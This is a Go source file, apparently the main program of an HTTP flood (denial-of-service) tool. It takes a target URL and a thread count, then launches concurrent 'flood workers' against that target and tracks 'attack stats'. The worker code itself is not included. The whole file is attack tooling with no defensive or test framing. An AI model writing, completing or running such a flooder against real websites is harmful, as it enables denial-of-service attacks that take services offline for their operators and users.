package main

import (
	"fmt"
	"gopkg.in/alecthomas/kingpin.v2"
	"log"
	"net/url"
)

//Command line args
var (
	verbose = kingpin.Flag("verbose", "Verbose mode.").Short('v').Bool()
	threads = kingpin.Flag("threads", "Amount of concurrent attacking threads.").Default("8").Short('t').Int()
	target  = kingpin.Arg("url", "Target URL e.g http://google.com").Required().String()
)

//Attack stats
var (
	totalRequestsSent int
	threadCounter     int
	threadDoneCounter int
	exitChan          chan int
)

func main() {
	//Parse arguments
	kingpin.Parse()
	u, err := url.Parse(*target)
	if err != nil {
		log.Fatal(err) //URL Invalid
	}

	if !((u.Scheme == "http") || (u.Scheme == "https")) {
		log.Fatal(fmt.Sprintf("URL scheme (%s) unsupported", u.Scheme))
	}

	//Reflect arguments
	if *verbose {
		fmt.Printf("URL => %s\n", *target)
		fmt.Printf("Threads => %d\n", *threads)
	}

	exitChan := make(chan int)

	//Start flood workers
	for threadCounter < *threads {
		worker := floodWorker{
			exitChan: exitChan,
			id:       threadCounter,
			target:   *u,
		}

		if *verbose {
			fmt.Printf("Thread %x started\n", threadCounter)
		}

		worker.Start()
		threadCounter += 1
	}

	//Wait for workers to finish before exit
	for threadDoneCounter < *threads {
		deadId := <- exitChan
		if *verbose {
			fmt.Printf("Thread %x ended\n", deadId)
		}
	}
	return
}
